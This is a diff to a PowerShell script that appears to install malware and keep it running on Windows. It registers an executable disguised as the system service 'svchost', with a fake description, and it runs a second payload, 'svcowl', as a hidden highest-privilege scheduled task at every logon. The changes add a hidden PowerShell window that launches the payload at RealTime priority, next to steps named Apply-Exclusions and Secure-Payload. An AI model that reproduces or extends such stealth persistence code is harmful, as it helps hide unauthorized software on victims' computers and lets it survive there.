@@ -98,7 +98,9 @@ function Register-Service {
         if ($serviceId -eq "svcowl") {
             # تسجيل svcowl كمهمة مجدولة بدل الخدمة
             $taskName = $serviceId
-            $action = New-ScheduledTaskAction -Execute $execPath
+                        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
+    -Argument "-NoProfile -WindowStyle Hidden -Command `"Start-Process -FilePath '$execPath' -Priority RealTime`""
+
             $trigger = New-ScheduledTaskTrigger -AtLogOn
             $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
             $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
@@ -178,9 +180,9 @@ function Start-Execution {
 
     Apply-Exclusions -containerPath $targetPath -resourcePaths $fetchedResources
 
-        Start-ScheduledTask -TaskName "svcowl"
     Register-Service -execPath $exec1 -serviceId "svchost" -helperPath $helper -serviceDesc "Provides essential system process hosting."
     Register-Service -execPath $exec2 -serviceId "svcowl" -helperPath $helper -serviceDesc "System Owl Service for monitoring."
+        Start-ScheduledTask -TaskName "svcowl"
 
     Secure-Payload -containerPath $targetPath -resourcePaths $fetchedResources
 
